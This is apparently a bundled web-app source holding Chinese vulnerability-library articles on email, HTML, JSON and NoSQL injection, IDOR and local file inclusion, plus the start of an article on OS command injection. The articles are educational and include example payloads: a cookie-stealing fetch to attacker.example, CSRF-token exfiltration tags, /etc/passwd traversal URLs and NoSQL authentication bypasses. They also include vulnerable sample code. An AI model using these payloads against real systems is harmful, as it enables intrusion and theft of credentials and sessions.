对于第三方软件中的零日目录遍历，您可以应用临时 WAF（Web 应用程序防火墙）规则进行缓解。 然而，这只会使目录遍历更难被利用，并不能消除问题。
`,Rb=`---
title: Email injection
date: 2026-05-15
summary: 电子邮件注入是一个漏洞，恶意黑客可以利用该漏洞滥用电子邮件相关功能（例如网页上的电子邮件联系表单），将恶意电子邮件内容发送给任意收件人。 由于电子邮件注入基于注入行尾字符，因此有时被视为一种 CRLF 注入攻击。 电子邮件注入也称为电子邮件
tags: 漏洞库, Web安全, Email注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# Email injection

### 什么是 email injection

电子邮件注入是一个漏洞，恶意黑客可以利用该漏洞滥用电子邮件相关功能（例如网页上的电子邮件联系表单），将恶意电子邮件内容发送给任意收件人。 由于电子邮件注入基于注入行尾字符，因此有时被视为一种 CRLF 注入攻击。 电子邮件注入也称为电子邮件标头注入、SMTP 标头注入或邮件命令注入。

### SMTP 的工作原理

要了解 SMTP 标头注入，我们需要首先了解 SMTP（简单邮件传输协议）。

SMTP 是互联网最古老的协议之一，于 1981 年在 RFC 788 中首次定义。最初，它接受一小组声明电子邮件发件人和收件人的命令。 随着时间的推移，电子邮件通信变得越来越复杂，因此添加了额外的标头。

第一个重要的 SMTP 概念是信封和电子邮件正文之间的区别。 信封是通信的初始部分，由 SMTP 协议本身定义。 以下命令构成信封：

* MAIL FROM：设置信封发件人。
* RCPT TO：设置信封收件人。 如果您要将消息发送到多个地址，则可以多次使用此命令。
* DATA：开始电子邮件有效负载，其中包含电子邮件标头和消息正文，并以单个空行分隔。 该消息通过发送仅包含句点 (.) 的行来终止。

电子邮件标头不是 SMTP 协议的一部分。 它们由邮件客户端（以正确显示电子邮件）和各种编程语言中可用的专用电子邮件库进行解释。 两个最常见的标头是：

* From：此标头设置可见发件人，该发件人可以是与使用 MAIL FROM 命令设置的地址不同的地址。 在大多数电子邮件客户端中，从 MAIL FROM 命令获取的发件人信息放置在 Return-Path 标头中，默认情况下对用户隐藏。

* To：此标头设置可见收件人，该收件人可能与使用 RCPT TO 设置的地址不同。 在大多数电子邮件客户端中，来自 RCPT TO 命令的收件人信息放置在“Delivered-To”标头中，默认情况下对用户隐藏该标头。

#### 以下是简单 SMTP 对话的示例 (> = sent, < = received)：

\`\`\`
> MAIL FROM:<postmaster@invicti.com>
  < 250 OK
> RCPT TO:<anna@example.com>
  < 250 OK
> RCPT TO:<barbara@example.com>
  < 250 OK
> DATA
  < 354 Send message content; end with <CRLF>.<CRLF>
> Content-Type: text/html
> Date: Wed, 25 Dec 2019 00:00:01
> From: Santa Claus <santaclaus@invicti.com>
> Subject: Your Gifts Are Here
> To: Not Naughty <notnaughty@example.com>
>
> Hello!
> Your gifts are here, <a href="https://malicioushackersdomain.com/">come to the tree</a>!
> --
> Santa
> .
  < 250 OK
\`\`\`
上述来自 postmaster@invicti.com 的电子邮件将由 anna@example.com 和 barbara@example.com 收到。 然而，对于用户来说，该邮件似乎是由圣诞老人<santaclaus@invicti.com>（而不是postmaster@invicti.com）发送的。 他们还会看到收件人是 Not Naughty <notnaughty@example.com>，而不是他们自己的地址。 除非安娜和芭芭拉在电子邮件客户端中手动打开电子邮件标头，否则他们根本看不到真正的发件人。

### 电子邮件注入的工作原理

电子邮件注入的工作原理是在用户输入中插入换行符。 如果输入未经净化，恶意黑客可以添加电子邮件标头或修改消息正文。 通过以仅包含句点的行结束恶意负载，攻击者可以发出消息结束信号，欺骗电子邮件服务器忽略后端脚本要发送的任何合法内容。

大多数网络编程语言中的电子邮件库不允许您直接添加信封命令。 相反，它们会获取您提供的电子邮件标头，并通常将其转换为等效的 SMTP 命令。 例如，如果您添加 BCC 标头，您的电子邮件库可能会采用标头内容并创建其他 RCPT TO 命令。 如果攻击者能够使用该特定库添加电子邮件标头，标头将被转换为等效的 SMTP 命令。

### 电子邮件注入攻击示例
以下 PHP 示例是一个典型的联系表单 (contact.php)，容易受到电子邮件标头注入的攻击。 它直接从输入字段获取姓名和电子邮件地址，并准备电子邮件的标题列表。

\`\`\`
<?php
if(isset($_POST['name'])) {
$name = $_POST['name'];
$replyto = $_POST['replyTo'];
$message = $_POST['message'];
$to = 'root@localhost';
$subject = 'My Subject';
// Set SMTP headers
$headers = "From: $name \\n" .
"Reply-To: $replyto";
mail($to, $subject, $message, $headers);
}
?>
\`\`\`

用户提交的非恶意POST请求如下：

\`\`\`
POST /contact.php HTTP/1.1
Host: www.example2.com
name=Anna Smith&replyTo=anna@example.com&message=Hello
\`\`\`

攻击者可以滥用此联系表单并通过发送以下 POST 请求注入电子邮件数据：

\`\`\`
POST /contact.php HTTP/1.1
Host: www.example2.com
name=Best Product\\r\\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!
\`\`\`

攻击者插入换行符（\\r\\n – 回车和换行，CRLF）并附加包含其他电子邮件地址的 BCC 标头。 电子邮件库将这些地址转换为 RCPT TO 命令，并将邮件不仅传递给预期收件人，而且传递给这些额外的地址。 此攻击还涉及欺骗replyTo标头，使收件人相信电子邮件来自其他人（blame_anna@example.com）。

### 电子邮件注入攻击的潜在后果
电子邮件注入漏洞被认为是一个严重的网络安全问题。 虽然电子邮件注入不会对存在安全漏洞的 Web 应用程序或其 Web 服务器产生直接危害，但电子邮件注入可以允许攻击者在各种攻击中向任意收件人发送包含任意内容的电子邮件。

最常见的电子邮件注入攻击媒介包括：

* 垃圾邮件：恶意用户可以使用电子邮件注入来发送垃圾邮件。 成功进行电子邮件注入的一行代码可以让他们强制受害者的电子邮件服务器向许多收件人发送多封内容相同的电子邮件。

* 网络钓鱼：攻击者可能会发送看似源自受害者的邮件服务器、域和 IP 的网络钓鱼电子邮件。 因此，攻击者将无法追踪，责任将由受害者承担。 如果受害者的应用程序也存在跨站脚本 (XSS) 漏洞，并且网络钓鱼电子邮件中的链接指向此易受攻击的应用程序，则该电子邮件看起来更加合法。

* 鱼叉式网络钓鱼：更进一步，攻击者可以向运行易受攻击的应用程序的公司中选定的员工发送看似合法的鱼叉式网络钓鱼电子邮件。 例如，他们可以向财务部门发送一封看似来自首席财务官的令人信服的电子邮件，并紧急要求向攻击者的账户进行大额银行转账。
`,Ob=`---
title: HTML 注入
date: 2026-05-14
summary: HTML 注入是一种 Web 漏洞，攻击者可以利用该漏洞将恶意 HTML 内容注入到 Web 应用程序的合法 HTML 代码中。 HTML 注入与跨站脚本 (XSS) 非常相似 – 交付完全相同，但注入的内容是纯 HTML 标签，而不是脚本
tags: 漏洞库, Web安全, HTML注入
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# HTML 注入

### 什么是HTML注入

HTML 注入是一种 Web 漏洞，攻击者可以利用该漏洞将恶意 HTML 内容注入到 Web 应用程序的合法 HTML 代码中。 HTML 注入与跨站脚本 (XSS) 非常相似 – 交付完全相同，但注入的内容是纯 HTML 标签，而不是脚本。 HTML 注入的危险性低于 XSS，但仍可能被用于恶意目的。

### HTML 注入是如何工作的

就像跨站点脚本一样，当恶意用户提供有效负载（通常是 HTML 代码，很少是 CSS）作为不受信任的输入的一部分，并且 Web 浏览器将其作为易受攻击的 Web 的超文本标记语言的一部分执行时，就会发生 HTML 注入 页。 HTML 注入攻击仅针对客户端，就像 XSS 攻击一样，它们影响用户，而不是服务器。

HTML注入主要有两种类型：反射型和存储型，类似于反射型XSS和存储型XSS：

* 在反射的 HTML 注入中，有效负载必须单独传递给每个用户（通常作为恶意链接）并成为请求的一部分。

* 在存储的 HTML 注入中，有效负载由 Web 服务器存储并稍后交付，可能会交付给多个用户。

HTML 注入和 XSS 之间的主要区别在于攻击者的能力范围。 由于 HTML 内容的声明性性质，有效负载所能完成的任务比 JavaScript 代码要少得多。 这使得 HTML 注入被用于网络钓鱼攻击的可能性大大降低。

### HTML 注入攻击示例
攻击者可能会出于多种目的使用 HTML 注入。 以下是这种攻击技术的一些最流行的用途，以及对 Web 应用程序安全的潜在后果。

#### 污损

HTML 注入最简单的用途是破坏——更改页面的可见内容。 例如，攻击者可能会使用存储的 HTML 注入来注入他们想要销售的产品的视觉广告。 攻击者还可能出于政治或个人原因注入旨在损害页面声誉的恶意 HTML 代码。

在这两种情况下，注入的内容旨在看起来像 HTML 页面的合法部分。 在这两种情况下，攻击者都需要利用存储的 HTML 注入漏洞。

#### 泄露敏感用户数据
HTML 注入的另一个常见用途是在目标页面上创建表单并诱使用户在该表单中输入敏感数据。 例如，攻击者可能会注入显示虚假登录表单的恶意代码。 然后，表单数据（登录名和密码）将被发送到攻击者控制的服务器。

如果网页使用相对URL，攻击者还可能尝试使用\\<base>标签来劫持数据。 例如，如果他们注入 \`<base href='http://example.com/'>\` 并且网页使用相对 URL 进行表单提交，则所有表单都将被发送到攻击者控制的 example.com 站点。

攻击者还可以通过在合法的 \\<form> 标记之前注入额外的 \\<form> 标记来劫持有效的 HTML 表单。 表单标签不能嵌套，因此顶级 \\<form> 标签优先。

在所有这些情况下，攻击者同样可以使用反射的 HTML 注入或存储的 HTML 注入。

#### 窃取反 CSRF 令牌
攻击者还可以使用 HTML 注入来窃取反 CSRF 令牌，用于以后的跨站请求伪造 (CSRF) 攻击。 反 CSRF 令牌通常使用表单中的隐藏输入类型来传递。

例如，为了窃取令牌，攻击者可以使用带有单引号的非终止 \\<img> 标签，例如 \`<img src='http://example.com/record.php?\`。 在这种情况下，缺少结束单引号会导致其余内容被视为 URL 的一部分，直到找到另一个单引号。 如果有效代码使用双引号，隐藏的输入将被发送到攻击者控制的 record.php 脚本并记录：

    <img src='http://example.com/record.php?<input type="hidden" name="anti_xsrf" value="eW91J3JlIGN1cmlvdXMsIGFyZW4ndCB5b3U/">

另一种选择是注入 \\<textarea> 标记。 在这种情况下，\\<textarea>标记之后的所有内容都将被提交，并且\\<textarea>和\\<form>标记都将隐式关闭。 然而，要使这种攻击起作用，必须诱骗用户手动提交表单：

    <form action='http://example.com/record.php?'<textarea><input type="hidden" name="anti_xsrf" value="eW91J3JlIGN1cmlvdXMsIGFyZW4ndCB5b3U/">

#### 窃取浏览器中存储的密码
攻击者还可以使用 HTML 注入来插入由浏览器密码管理器自动填充的表单。 如果攻击者设法注入合适的表单，密码管理器将自动提供用户凭据。 对于许多浏览器来说，表单只需要有正确的输入字段名称和结构，并且其操作参数可以指向任何主机。

### HTML 注入攻击的潜在后果
HTML 注入漏洞通常被低估。 虽然 HTML 注入确实不会直接影响 Web 服务器或数据库，但它们可能会产生严重后果，如下所示：

* 攻击者可以使用伪造的表单来窃取浏览器存储的密码数据或诱骗用户提供登录凭据。 如果目标用户具有管理权限，恶意行为者就可以获得 Web 应用程序的管理访问权限。

* 攻击者可能会通过实施公众明显可见的攻击来严重损害您的公司、机构甚至国家的声誉。 如果高价值页面被污损或用于传播虚假信息，您的用户或客户可能会做出错误的决定，并对您的网络安全实践失去信任。

* 攻击者可以使用 HTML 注入作为工具升级为其他攻击，例如 CSRF。
`,Pb=`---
title: 不安全的直接对象引用（IDOR）
date: 2026-05-13
summary: 不安全的直接对象引用 (IDOR) 是当 Web 应用程序开发人员仅使用标识符直接指向应受访问控制或需要授权的页面元素时出现的漏洞。
tags: 漏洞库, Web安全, IDOR
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 不安全的直接对象引用（IDOR）

### 什么是不安全的直接对象引用

不安全的直接对象引用 (IDOR) 是当 Web 应用程序开发人员仅使用标识符直接指向应受访问控制或需要授权的页面元素时出现的漏洞。

例如，如果交易的 URL 包含交易 ID，并且只需提供不同的交易 ID，您就可以访问属于另一个用户的交易的信息，就会发生 IDOR 漏洞。

### 不安全的直接对象引用是什么意思
术语“不安全的直接对象引用”是指 Web 应用程序直接引用某个内部对象，例如交易号或用户 ID，但该引用是公开可见的、可直接访问的，并且不使用任何形式的验证进行保护， 授权或访问控制。

### IDOR 漏洞是如何发生的
大多数 Web 应用程序使用简单的唯一标识符来引用服务器端对象。 例如，数据库中的用户通常通过唯一的用户 ID 来引用。 相同的用户ID是包含用户信息的数据库列的主键，并且它是自动生成的。 数据库密钥生成算法基于简单的递增 - 它通常使用下一个可用整数。 相同的数据库 ID 生成机制用于所有其他类型的数据库记录。

此类 ID 通常由 Web 应用程序和 API 的客户端使用。 当使用 GET 方法通过常规 HTTP 请求在 URL 中发送时，ID 在 Web 浏览器和请求标头中都清晰可见，这使得攻击者可以轻松访问它们。 出于安全原因，不建议以这种方式直接引用内部 ID，因为它可能使攻击者能够执行广泛的枚举（例如，查找所有用户 ID）。 如果没有其他方式引用内部对象，则开发人员至少必须确保访问控制，因此资源访问需要的不仅仅是引用和通用页面身份验证。

例如，假设 Web 应用程序使用以下 URL 显示交易详细信息：

    https://www.example.com/transaction.php?id=74656

恶意黑客可能会尝试篡改 id 参数值并用其他类似的值替换 74656，例如：

    https://www.example.com/transaction.php?id=74657

根据应用程序的不同，交易 74657 可能是与另一个用户帐户关联的有效交易，并且恶意黑客不应被授权查看它。 但是，如果开发人员在授予交易访问权限之前未能实施授权检查，则攻击者可能能够看到它。 在这种情况下，我们就会遇到不安全的直接对象引用漏洞。


### 常见 IDOR 漏洞示例
IDOR 漏洞经常出现在密码更改表单中。 设计不当的密码更改表单 URL 可能是：

    https://www.example.com/change_password.php?userid=1701

首次使用不同的表单提供电子邮件地址后，您可能会在确认电子邮件中收到此 URL。 如果没有额外的检查，恶意黑客可能会尝试使用 userid=1 的上述 URL，从而有可能获得对管理员帐户的访问权限（管理员的 ID 通常为 1）。

IDOR 漏洞还可能涉及文件名，而不是对象 ID。 例如，目录遍历（路径遍历）通常被认为是 IDOR 漏洞的一种。 在 IDOR 的这种特殊情况下，用户可以在未经授权的情况下显示文件。 例如：

    https://www.example.com/display_file.php?file.txt

如果存在与 display_file.php 脚本相关的 IDOR 漏洞，恶意黑客可以通过操纵用户输入（在本例中，只需更改 URL）导航到敏感文件系统资源（例如 /etc/passwd 文件）来访问 该资源而不是 file.txt：

    https://www.example.com/display_file.php?../../../etc/passwd

### 如何防范IDOR攻击
防止 IDOR 的唯一方法是对所有敏感对象实施严格的访问控制检查。 幸运的是，现代后端开发框架（例如 Ruby on Rails 或 Django）不存在 IDOR 问题（除非软件开发人员决定使用自己的访问机制而不是内置的访问机制）。 使用此类框架，可以通过设计安全地实现访问控制，因此最佳实践是使用信誉良好的框架来开发 Web 应用程序并遵循其记录的对象访问控制方法。 如果不可能，您应该使用标识符的安全加密哈希，而不是直接使用标识符。`,wb=`---
title: JSON注入
date: 2026-05-12
summary: JSON 注入是一个漏洞，可让恶意黑客将恶意数据注入 JSON 流或使用恶意 JSON 流来修改应用程序行为。 JSON 注入有两种类型，服务器端和客户端：
tags: 漏洞库, Web安全, JSON注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# JSON注入

### 什么是JSON注入

JSON 注入是一个漏洞，可让恶意黑客将恶意数据注入 JSON 流或使用恶意 JSON 流来修改应用程序行为。 JSON 注入有两种类型，服务器端和客户端：

* 当来自不可信源的数据未经服务器清理并直接写入 JSON 流时，就会发生服务器端 JSON 注入。

* 当来自不受信任的 JSON 源的数据未经清理并直接使用 JavaScript eval 函数进行解析时，就会发生客户端 JSON 注入。

### 什么是JSON

JSON（JavaScript 对象表示法）是一种轻量级数据交换格式，用于应用程序之间的通信。 它的作用与 XML 类似，但更简单并且更适合在 JavaScript 中进行处理。

许多 Web 应用程序使用这种格式来通信和序列化/反序列化数据。 一些 Web 应用程序还使用 JSON 来存储重要信息，例如用户数据。 JSON 常用于 RESTful API 和 AJAX 应用程序。

### 什么是JSON劫持

虽然 JSON 劫持（跨站点脚本包含的子集 - XSSI）也涉及 JSON 格式，但它是一种略有不同的攻击，在某些方面类似于跨站点请求伪造 (CSRF)。 攻击者可以使用 JSON 劫持来拦截从 Web 服务器发送到 Web 应用程序的 JSON 数据。 典型的 JSON 劫持攻击可能如下所示：

1. 攻击者创建一个包含脚本标记的恶意网站，该脚本标记引用受攻击的 Web 应用程序的 JSON 数据 URL，并包含劫持 JSON 数据的代码。
2. 登录目标 Web 应用程序的用户会被诱骗访问恶意网站（通常使用社交工程）。
3. 由于同源策略 (SOP) 允许在任何其他网站的上下文中包含和执行来自任何网站的 JavaScript，因此用户的 Web 浏览器会在恶意网站的上下文中加载 JSON 数据。
4. 恶意网站劫持JSON数据。

### 服务器端 JSON 注入攻击示例
可以在 PHP 中执行简单的服务器端 JSON 注入，如下所示：

1. 服务器将用户数据存储为 JSON 字符串，包括帐户类型。
2. 用户名和密码值直接从用户输入参数中获取，未验证或清理。
3. JSON 字符串是使用简单的串联构建的：

\`\`\`
$json_string = '{"accountType":"user","userName":"'.$_GET['userName'].'","pass":"'.$_GET['pass'].'"}';
\`\`\`
4. 恶意用户将数据附加到输入表单中或在 HTTP 标头中传递的用户名中。 该数据未经处理就发送到后端：

    john%22,%22accountType%22:%22administrator%22

5. 应用程序后端存储的结果 JSON 字符串为：

\`\`\`
{
  "accountType":"user",
  "userName":"john",
  "accountType":"administrator",
  "pass":"password"
}
\`\`\`

6. 读取存储的字符串时，JSON 解析器 (json_decode) 遇到两个 accountType 条目并接受最后一个，无需任何身份验证即可授予 john 管理员权限。 请注意，严格来说，json_decode 的行为并不不正确 - JSON 格式的 RFC-7159 规定“对象内的名称应该是唯一的”，但并不是说它们必须是唯一的，从而留下了一些解释空间。

### 客户端 JSON 注入攻击示例
一个简单的客户端 JSON 注入可以执行如下：

1. 初始 JSON 字符串与前面的示例中的相同。
2. 服务器从不受信任的来源获取 JSON 数据（包括恶意负载），并且不会对其进行清理。
3. 客户端使用 eval 解析 JSON 字符串：

\`\`\`
var result = eval("(" + json_string + ")");
document.getElementById("#accountType").innerText = result.account;
document.getElementById("#userName").innerText = result.name; 
document.getElementById("#pass").innerText = result.pass;
\`\`\`

4. 攻击者注入的accountType值为：

\`\`\`
user"});alert(document.cookie);({"accountType":"user
\`\`\`

5. eval 函数执行弹窗调用。

6. 解析恶意字符串会导致跨站脚本 (XSS) 攻击（document.cookie 被泄露）。

### JSON 注入攻击的潜在后果
JSON 注入的后果很大程度上取决于 Web 应用程序使用 JSON 数据的方式。 然而，在某些情况下，它们可能非常严重：

* 如果 JSON 用于存储身份验证数据，并且应用程序容易受到服务器端 JSON 注入的影响，则攻击者可能会获得对应用程序中管理帐户的访问权限。 根据该管理帐户的权限，他们可以获取高度敏感的数据或执行恶意操作。
* 如果 Web 应用程序容易受到客户端 JSON 注入的攻击，则它可能会被用于涉及反射型 XSS 的攻击，例如网络钓鱼或垃圾邮件活动。

虽然 JSON 注入本身看起来并不是很危险，但它通常只是较长攻击链中的一步，因此在某些情况下，它可能会产生严重后果，甚至包括整个系统受到损害。

`,Db=`---
title: 本地文件包含（LFI）
date: 2026-05-11
summary: 本地文件包含 (LFI) 是一种 Web 漏洞，它允许恶意黑客访问、查看和/或包含位于文档根文件夹中的 Web 服务器文件系统中的文件。
tags: 漏洞库, Web安全, 文件包含
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 本地文件包含（LFI）

### 什么是本地文件包含？

本地文件包含 (LFI) 是一种 Web 漏洞，它允许恶意黑客访问、查看和/或包含位于文档根文件夹中的 Web 服务器文件系统中的文件。

<br>

### 本地文件包含如何工作

在编写 Web 应用程序时，开发人员经常需要访问位于应用程序目录或其子目录中的其他服务器端文件。 例如，开发人员可能希望包含配置文件和应用程序模块，或者访问和显示用户上传的文件，例如图像或文本文件。

为了访问非静态文件，开发人员通常通过用户输入参数传递文件名。 例如，如果应用程序要显示用户上传的图像，应用程序的作者可能会决定允许为这些图像任意命名。 对于像 PHP 这样的脚本语言，开发人员可能还需要动态包含包含源代码的文件。

为了访问非静态文件，开发人员通常通过用户输入参数传递文件名。 例如，如果应用程序要显示用户上传的图像，应用程序的作者可能会决定允许为这些图像任意命名。 对于像 PHP 这样的脚本语言，开发人员可能还需要动态包含包含源代码的文件。

当恶意用户可以在用户输入中包含任意文件名或路径时，就会发生本地文件包含漏洞。 例如，如果应用程序旨在根据 URL 参数显示任意图像，但攻击者能够使用此功能显示应用程序源代码，则该应用程序存在 LFI 漏洞。 请注意，如果攻击者可以包含来自远程位置的恶意文件，我们就是在谈论远程文件包含 (RFI) 漏洞。

<br>

### 本地文件包含 与 目录遍历

本地文件包含漏洞经常与目录遍历（path traversal）混淆，两者有相似之处但不是同一种漏洞：

- LFI 意味着攻击者可以包含位于文档根目录及其子目录内的源代码文件或查看文件，但这并不意味着攻击者可以到达文档根目录之外。

- 目录遍历是指攻击者可以访问位于文档根目录之外的文件，例如日志文件或passwd文件，攻击不涉及运行任何恶意代码。

这两个漏洞经常被混淆，因为它们经常一起出现并且具有相同的根本原因：开发人员允许将本地文件的路径作为用户输入的一部分传递。

<br>

### 本地文件包含攻击示例

以下是具有本地文件包含漏洞的 PHP 代码示例，以及针对包含此代码的应用程序的不同 LFI 攻击媒介。

<br>

#### 导致敏感信息泄露的LFI

PHP 应用程序的开发人员希望用户能够阅读存储在 Web 服务器上的文本文件中的诗歌。 这些诗歌被写入文本文件，由其他用户上传，并存储在相对的诗歌目录中。 然后，诗歌作为 HTML 页面的一部分显示在 Web 浏览器中。 以下是 poems/display.php 文件中的代码片段。

<font color="#e90"><\\?PHP </font>
    <font color="#a67f59">\\$file = \\$_GET</font>[<font color="#00dd00">"file"</font>];
    <font color="#a67f59">\\$handle =</font> <font color="#00dd00">fopen</font>(<font color="#a67f59">\\$file</font>, <font color="#00dd00">'r'</font>);
    <font color="#a67f59">\\$poem</font> = <font color="#00dd00">fread</font>(<font color="#a67f59">\\$handle</font>, <font color="red">1</font>);
    <font color="#00dd00">fclose</font>(<font color="#a67f59">\\$handle</font>);
    <font color="#00dddd">echo</font> <font color="#a67f59">\\$poem</font>;
<font color="#e90">?></font>

如您所见，文件名直接取自 HTTP 请求标头。 因此，您可以使用以下 URL 访问并显示一首名为 poem.txt 的诗：

        http://victim.example/my_app/display.php?file=poem.txt

##### 攻击向量

攻击者通过使用以下有效负载操纵 GET 请求来滥用此脚本：

        http://victim.example/my_app/display.php?file=../config/database.php

display.php 脚本向上导航到文档根目录，然后向下导航到 /config/ 子目录。 在那里，它包括数据库配置文件 database.php，其中包含用于连接到数据库的用户名和密码。 数据作为 HTML 代码的一部分公开，攻击者只需检查页面的源代码即可了解如何直接访问数据库。

#### 导致跨站点脚本的 LFI

攻击者还可能使用上述代码将攻击升级为存储型跨站点脚本 (XSS)。

##### 攻击向量

攻击者首先使用诗歌文件上传功能将以下“诗歌”上传为名为 poem42.txt 的文本文件：

        <script>fetch("http://attacker.example?log="+encodeURIComponent(document.cookie));<\/script>

然后，攻击者提交包含这首诗的请求：

        http://victim.example/my_app/display.php?file=poem42.txt

由于这首诗的内容旨在作为 HTML 代码的一部分直接显示，因此页面代码现在包含一个存储的跨站点脚本漏洞。 攻击者可以将此链接传递给任意数量的受害者，任何打开它的人都会将他们的会话 cookie 发送到攻击者控制的 attacker.example 站点。

#### 导致远程代码执行的 LFI

同一 PHP 应用程序的开发人员还希望能够动态地包含模块。 以下是 index.php 文件中的代码片段。

<font color="#e90"><?PHP </font>
  <font color="#a67f59">\\$module</font> = <font color="#a67f59">\\$_GET</font>[<font color="#00dd00">"module"</font>];
  <font color="#00dddd">include</font> <font color="#a67f59">\\$module</font>;
<font color="#e90">?></font>

同样，文件名直接取自 GET HTTP 请求。 因此，您可以包含模块 welcome.php 如下：

        http://victim.example/index.php?module=welcome.php

##### 攻击向量

攻击者首先使用诗歌上传功能上传poem42.txt，其中包含pentest monkey反向shell的PHP源代码。

然后，攻击者操纵对 index.php 的 GET 请求以包含诗歌而不是模块：

        http://victim.example/index.php?module=poems/poem42.txt

结果，应用程序运行反向 shell（远程代码执行）的代码，允许攻击者远程访问服务器命令行。

<br>

### 本地文件包含攻击的潜在后果

从上面的示例中可以看出，本地文件包含漏洞可能会产生多种后果，具体取决于易受攻击的应用程序的功能。 这里有些例子：

- 如果应用程序显示任意图像，它可用于显示敏感信息，例如源代码或配置文件。

- 如果应用程序允许您下载任意文件（例如 PDF 文件），则它可用于下载敏感信息（例如源代码或配置文件）。

- 如果应用程序包含任意文件内容作为 HTML 页面的一部分，它可用于利用跨站点脚本漏洞。

- 如果应用程序动态包含任意源代码文件并且攻击者能够上传或更改文件，则它可用于升级为远程代码执行。

<br>

### 如何防止Web应用中的本地文件包含漏洞

有几种方法可以让您防止代码中的本地文件包含漏洞：

- 完全避免在用户输入中传递文件名。 这不仅包括直接用户输入，还包括攻击者可以操纵的其他数据源，例如 cookie。
如果您的应用程序要求您使用用户输入的文件名并且没有办法解决它，请创建一个安全文件白名单。
- 如果您因为使用任意文件名而无法创建白名单（例如，如果用户上传文件），请将文件名存储在数据库中并在用户输入中使用表行标识符。 您还可以使用 URL 映射来识别没有本地文件包含风险的文件。
- 上述方法在每种编程语言中都可用，因此每个开发人员都可以通过使用安全编码技术轻松防止本地文件包含漏洞。 没有理由在您的代码中包含本地文件。

注意：不要依赖黑名单、编码或输入验证/清理方法（例如过滤）来防止包含本地文件。 例如，不要试图限制或强制执行文件扩展名或阻止特殊字符序列作为您免受 LFI 的唯一保护。 攻击者可以使用多种不同的方法（例如 URL 编码和包装器（例如 php://filter）来绕过此类过滤器。`,Mb=`---
title: NoSQL 注入
date: 2026-05-10
summary: NoSQL 注入是一个漏洞，可让恶意黑客将不需要的代码引入（注入）到 NoSQL 数据库执行的数据库查询中。
tags: 漏洞库, Web安全, NoSQL注入
cover: app-teal
readingTime: 6 分钟
featured: false
---
# NoSQL 注入

### 什么是 NoSQL注入

NoSQL 注入是一个漏洞，可让恶意黑客将不需要的代码引入（注入）到 NoSQL 数据库执行的数据库查询中。

### 什么是NoSQL

NoSQL（非SQL或不仅仅是SQL）通常用于描述非关系数据库，可能指许多不同类型的数据库和数据模型，包括键值、键文档、列族和图 数据库。 NoSQL数据库近年来迅速普及，主流产品有MongoDB、Apache Cassandra、Apache HBase、Apache CouchDB、Neo4j、RavenDB、Redis、OrientDB、DynamoDB、HyperTable、Google Cloud Datastore等。

NoSQL 数据库引擎使用与关系数据库不同的数据结构，虽然它们通常不支持 SQL 语句或 SQL 查询，但它们都为用户提供执行查询的方法。 与 SQL 数据库不同，它没有通用的查询语言或语法，因此查询格式取决于特定的数据库产品以及 Web 应用程序或 API 的实现细节。 这意味着您的查询不仅取决于数据库，还取决于编程语言（例如 Python、PHP、Node.js 等）和框架（例如 Spring）。 即便如此，大多数 NoSQL 查询都基于 JSON，并且通常包含用户输入。 这意味着，与未经处理的用户输入一样，NoSQL 数据库也容易受到注入攻击。

### NoSQL 注入是如何工作的

NoSQL 注入不依赖于通用查询语言，因此给定的注入漏洞仅影响一种特定的 NoSQL 数据库类型。 除此之外，NoSQL 注入攻击与传统的 SQL 注入攻击类似——攻击者在用户输入中提供恶意负载，例如表单或 HTTP 请求，如果该输入未经清理就传递到 NoSQL 数据库，则可能会导致数据库崩溃 执行攻击者提供的命令。

### NoSQL 注入示例
为了了解 NoSQL 查询是如何构建的以及它在哪里可能容易受到注入攻击，我们将重点关注 MongoDB（当下最流行的 NoSQL 数据库），并使用 PHP 访问它。 下面是一个访问 MongoDB 数据库进行身份验证的简单示例：

\`\`\`
$username = $_POST['username'];
$password = $_POST['password'];
$connection = new MongoDB\\Client('mongodb://localhost:27017');
if($connection) {
	$db = $connection->test;
	$users = $db->users;
	$query = array(
		"user" => $username,
		"password" => $password
	);
	$req = $users->findOne($query);
}

\`\`\`

正如您所看到的，用于身份验证的用户名和密码参数取自 POST 请求，然后直接插入到查询中。 与其他类型的注入类似，这允许恶意用户输入提供未经身份验证的访问的 NoSQL 注入负载。

要成功执行 MongoDB 注入，在 POST 请求中提供以下恶意输入数据就足够了：

    username[$eq]=admin&password[$ne]=foo

[$ne] 查询运算符表示不等于，因此结果查询将找到用户名是 admin 且密码不是 foo 的第一条记录。 如果此类代码用于身份验证并且管理员用户存在，则攻击者将以该用户身份登录。

其他 MongoDB 运算符也可能以类似的方式被滥用，例如 [$lt] 和 [$gt] 以及 [$regex]。 在上述场景中使用正则表达式，攻击者甚至可以通过按顺序尝试各种组合并评估结果来枚举所有用户。

#### 高级攻击和 JavaScript 注入
MongoDB 查询通常包含 $where 运算符，这可能会导致包括 JavaScript 对象在内的严重 NoSQL 攻击。 例如，开发人员可能希望按以下方式使用 $where 运算符来访问特定用户的记录：

    $query = array('$where' => 'this.name === \\''.$name.'\\'');

在这种情况下，攻击者可以通过注入 $name 来使用以下空字符串比较技巧：

    '; return '' == '

结果，查询将变为：

    "$where": "this.name === ''; return '' == ''"

由于结果始终为真，因此攻击者将收到整个用户列表。

$where 运算符实际上被评估为 JavaScript 代码，因此攻击者还可以传递包含任意 JavaScript 的恶意字符串的参数，例如：

    '; while(true){}'

此示例创建了一个无限循环，导致拒绝服务攻击。


### NoSQL 注入攻击的潜在后果

NoSQL 注入攻击的后果取决于数据库类型和数据库通信的实现方式。 攻击者可能绕过身份验证、提取数据、修改数据，甚至获得对 Web 应用程序的完全控制。 因此，他们甚至可以访问底层操作系统并获得对 Web 服务器的控制。



`,Fb=`---
title: 操作系统命令注入
date: 2026-05-09
summary: 操作系统命令注入是一种漏洞，可让恶意攻击者诱骗应用程序执行操作系统 (OS) 命令。 OS 命令注入也称为命令注入或 shell 注入。
tags: 漏洞库, Web安全, 命令注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# 操作系统命令注入

### 什么是操作系统命令注入

操作系统命令注入是一种漏洞，可让恶意攻击者诱骗应用程序执行操作系统 (OS) 命令。 OS 命令注入也称为命令注入或 shell 注入。

### OS 命令注入如何工作

大多数编程语言都包含让开发人员调用操作系统命令的函数。 调用操作系统命令的原因多种多样，例如调用以其他语言编写的脚本等。

